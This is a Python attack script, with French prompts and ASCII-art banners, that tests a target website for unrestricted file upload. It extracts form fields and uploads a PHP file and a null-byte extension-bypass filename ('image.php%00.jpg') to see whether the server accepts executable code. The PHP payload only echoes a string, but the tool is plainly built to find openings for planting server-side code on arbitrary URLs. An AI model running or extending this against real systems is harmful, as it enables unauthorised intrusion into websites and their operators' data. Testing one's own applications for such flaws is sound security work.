import requests
import time
import base64
import argparse
import re

# ============== PAYLOAD ============== #
Main_payload = r"""
__/\\\\____________/\\\\_______________________________________________________________        
 _\/\\\\\\________/\\\\\\_______________________________________________________________       
  _\/\\\//\\\____/\\\//\\\_____________________________________/\\\______________________      
   _\/\\\\///\\\/\\\/_\/\\\___/\\\\\\\\\______/\\/\\\\\\_____/\\\\\\\\\\\___/\\\\\\\\\____     
    _\/\\\__\///\\\/___\/\\\__\////////\\\____\/\\\////\\\___\////\\\////___\////////\\\___    
     _\/\\\____\///_____\/\\\____/\\\\\\\\\\___\/\\\__\//\\\_____\/\\\_________/\\\\\\\\\\__   
      _\/\\\_____________\/\\\___/\\\/////\\\___\/\\\___\/\\\_____\/\\\_/\\____/\\\/////\\\__  
       _\/\\\_____________\/\\\__\//\\\\\\\\/\\__\/\\\___\/\\\_____\//\\\\\____\//\\\\\\\\/\\_ 
        _\///______________\///____\////////\//___\///____\///_______\/////______\////////\//__"""

Exit_payload = r"""
_____/\\\\\\\\\\\\_____________________________________/\\\_____________/\\\_____________________________________        
 ___/\\\//////////_____________________________________\/\\\____________\/\\\_____________________________________       
  __/\\\________________________________________________\/\\\____________\/\\\___________/\\\__/\\\________________      
   _\/\\\____/\\\\\\\_____/\\\\\________/\\\\\___________\/\\\____________\/\\\__________\//\\\/\\\______/\\\\\\\\__     
    _\/\\\___\/////\\\___/\\\///\\\____/\\\///\\\____/\\\\\\\\\____________\/\\\\\\\\\_____\//\\\\\_____/\\\/////\\\_    
     _\/\\\_______\/\\\__/\\\__\//\\\__/\\\__\//\\\__/\\\////\\\____________\/\\\////\\\_____\//\\\_____/\\\\\\\\\\\__   
      _\/\\\_______\/\\\_\//\\\__/\\\__\//\\\__/\\\__\/\\\__\/\\\____________\/\\\__\/\\\__/\\_/\\\_____\//\\///////___  
       _\//\\\\\\\\\\\\/___\///\\\\\/____\///\\\\\/___\//\\\\\\\/\\___________\/\\\\\\\\\__\//\\\\/_______\//\\\\\\\\\\_ 
        __\////////////_______\/////________\/////______\///////\//____________\/////////____\////__________\//////////__"""



#====================ARGUMENT====================
parser = argparse.ArgumentParser()
parser.add_argument('-u', '--url', dest='url', required=True, help='Url to exploit')
parser.add_argument('-c', '--cookie', dest='cookie', default=None, help='Cookie (k1=v1;k2=v2)')
parser.add_argument('-a', '--auto', dest='auto', action='store_true', help='Auto test every payload')
parser.add_argument('-H', '--header', dest='header', default=None, help='Headers (H1:v1;H2:v2)')
parser.add_argument('-b', '--body', dest='body', default=None, help='Extra body (unused)')
args = parser.parse_args()



#==========================FUNCTION=========================#
def extract_vars(html):
    forms = re.findall(r"<form[\s\S]*?</form>", html, flags=re.IGNORECASE)
    names = set()
    for form in forms:
        names.update(re.findall(r'name=["\']([^"\']+)["\']', form, flags=re.IGNORECASE))
        names.update(re.findall(r'name=([^"\'>\s]+)', form, flags=re.IGNORECASE))
    return list(names)

def upload_file(url, field_name, payload, cookies=None, headers=None):
    content = payload["content"]
    if isinstance(content, str):
        content = content.encode()

    files = {
        field_name: (
            payload["file_name"],
            content,
            payload["mime"])}
    return requests.post(url,files=files,data={"submit": "OK"},cookies=cookies,headers=headers)

def analyze_response(html):
    result = {"success": False, "error": None, "path": None}

    err = re.search(r"(wrong|error|invalid|denied|fail)[^<]*", html, re.I)
    if err:
        result["error"] = err.group(0).strip()
        return result

    path = re.search(r'href=[\'"]([^\'"]+/[^\'"]+)[\'"]', html, re.I)
    if path:
        result["success"] = True
        result["path"] = path.group(1)
        return result
    return result

#===============VAR===============#
payloads = {
    0: {"file_name": "sample.txt",
        "mime": "text/plain",
        "content": "Ceci est un test."},
    1: {"file_name": "image.php%00.jpg",
        "mime": "image/jpeg",
        "content": b"\xff\xd8\xff\xe0"},
    2: {"file_name": "image.php",
        "mime": "application/php",
        "content": "<?php echo 'ok'; ?>"}
}

cookies = None
headers = None

#====================================OPTIONS====================================#
if args.cookie:
    cookies = {}
    for c in args.cookie.split(";"):
        k, v = c.split("=", 1)
        cookies[k.strip()] = v.strip()

if args.header:
    headers = {}
    for h in args.header.split(";"):
        k, v = h.split(":", 1)
        headers[k.strip()] = v.strip()

if args.url:
    print(f"[+] Target : {args.url}")

    html = requests.get(args.url, cookies=cookies, headers=headers).text
    vars = extract_vars(html)

    if len(vars) == 0:
        print("[!] Aucun champ trouvé")
        exit()
    elif len(vars) == 1:
        field_name = vars[0]
        print(f"[+] Champ trouvé : {field_name}")
    else:
        print("[+] Champs disponibles :")
        for idx, var in enumerate(vars):
            print(f"[{idx}] {var}")
        field_name = vars[int(input("Choisis le numéro du champ d’upload : "))]

    if args.auto:
        tests = payloads.keys()
    else:
        print("\n[+] Payloads disponibles :")
        for idx in payloads:
            print(f"[{idx}] {payloads[idx]['file_name']}")
        tests = [int(input("Choisis le numéro du payload : "))]
    print("\n[+] Lancement des tests...\n")

    for idx in tests:
        payload = payloads[idx]
        print(f"[*] Upload '{payload['file_name']}' sur '{field_name}'")

        r = upload_file(args.url, field_name, payload, cookies, headers)
        res = analyze_response(r.text)

        if res["success"]:
            print(f"[+] SUCCESS → {res['path']}")
            print(html)
        else:
            print(f"[-] FAIL → {res['error']}")
            print(html)
    print("\n[+] Terminé")

else:
    print("[!] Tu dois spécifier une url (-u | --url)")